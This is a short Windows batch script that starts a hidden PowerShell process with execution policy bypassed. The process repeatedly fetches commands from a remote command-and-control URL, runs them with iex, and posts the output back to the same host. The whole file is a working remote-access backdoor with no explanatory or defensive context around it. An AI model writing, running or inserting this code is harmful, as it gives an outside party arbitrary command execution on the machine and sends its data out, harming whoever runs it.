@echo off
set C2=https://burns-endless-billy-department.trycloudflare.com

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"while($true){try{$cmd=((Invoke-WebRequest -Uri '%C2%/getcmd' -UseBasicParsing).Content|ConvertFrom-Json).cmd;if($cmd){$o=(iex $cmd 2>&1|Out-String);Invoke-WebRequest -Uri '%C2%/result' -Method POST -Body (@{output=$o}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing|Out-Null}}catch{};Start-Sleep 3}" &

exit
